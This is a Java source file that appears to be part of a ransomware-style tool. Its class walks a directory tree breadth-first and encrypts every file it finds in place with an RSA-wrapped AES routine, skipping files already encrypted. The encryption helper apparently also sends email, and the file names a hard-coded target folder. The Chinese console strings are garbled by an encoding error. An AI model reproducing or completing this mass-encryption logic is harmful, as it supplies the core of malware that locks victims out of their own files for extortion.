package com.fileoperate;

import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

import com.encrypt.RSAEncryptAES;
import com.utils.Utils;

public class EncryptAllFiles extends SearchFile {
	
	@Override
	public void doSomeThings(File file) {
		System.out.println("���ܲ���");
		if(Utils.ifEncrypt(file))
    	{
    		System.out.println("�ļ������ظ�����!");
    		return ;
    	}
    	RSAEncryptAES rsaEncryptAES = RSAEncryptAES.getRSAEncryptAES();
    	try {
			rsaEncryptAES.encrypt(file);
		} catch (InvalidKeyException | IllegalBlockSizeException | BadPaddingException
				| NoSuchAlgorithmException | NoSuchPaddingException
				| IOException | MessagingException e) {
			e.printStackTrace();
		}
	}
	
	public static void main(String[] args) {
	
		EncryptAllFiles encryptAllFiles = new EncryptAllFiles();
		String filePath = "D:\\dosbox";
	//	encryptAllFiles.deepFirstTravel(filePath);
	//	System.out.println("������ȱ�������������" + encryptAllFiles.getDeepFolderNum() 
	//			+ "���ļ���;" + encryptAllFiles.getDeepFileNum() + "���ļ�.");
		encryptAllFiles.breadthFirstTraver(filePath);
		System.out.println("������ȱ�������������" + encryptAllFiles.getBreadthFolderNum()
				+ "���ļ���;" + encryptAllFiles.getBreadthFileNum() + "���ļ�.");

	}

}
